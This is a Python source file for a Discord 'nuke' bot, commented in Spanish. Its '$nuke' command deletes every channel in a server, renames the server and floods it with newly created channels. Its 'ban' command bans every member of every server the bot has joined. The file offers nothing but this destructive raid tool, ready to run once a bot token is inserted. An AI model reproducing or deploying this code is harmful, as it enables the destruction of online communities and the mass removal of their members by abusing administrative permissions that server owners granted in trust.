import discord
import os
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands, tasks
from discord.ext.commands import Bot
from discord.ext.commands import *
import sys
import json
from title import title
import random
from colorama import Fore
from discord import Intents


os.system('cls')

TOKEN = ''

intents= Intents.default()
intents.members = True

intents = discord.Intents.all()

bot = commands.Bot(command_prefix = '$', intents=intents)
client = discord.Client()


@bot.event
async def on_ready():
    title()
    print('connected to bot: {}'.format(bot.user.name))
    print('Bot ID: {}'.format(bot.user.id))


#destruir server
@bot.command(name='nuke')
async def nuke(ctx):
    
    guild = ctx.message.guild
    await ctx.message.delete()
    nombre_ds = input(Fore.GREEN + '[*] ' + Fore.RESET + 'Ingrese el nombre del servidor nuevo: ')
    nombre_canal = input(Fore.GREEN + '[*] '  + Fore.RESET + 'nuevo canal-text: ')
    cant = int(input(Fore.RED + '[*] ' + Fore.RESET + 'cantidad de canales que desea crear: '))
    
    

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print("el canal " + f"{channel.name}" + Fore.RED + " fue eliminado" + Fore.RESET)
        except:
            pass

    for i in range(1):
        try:
            await ctx.guild.edit(name=nombre_ds)
            print("nombre cambiado")
        except:
            print('no se pudo cambiar el nombre')

    for i in range(1):
        await guild.create_text_channel(nombre_canal)

   
    for i in range(cant):
        await guild.create_text_channel(nombre_canal)
        print(Fore.GREEN + 'canal creado ' + Fore.RESET + 'nombre del canal: ' + Fore.YELLOW + f'{channel.name}')


@bot.command()
async def ban(ctx):
    for guild in bot.guilds:
        for member in guild.members:
            try:
                await guild.ban(member)
            except:
                pass






bot.run(TOKEN)
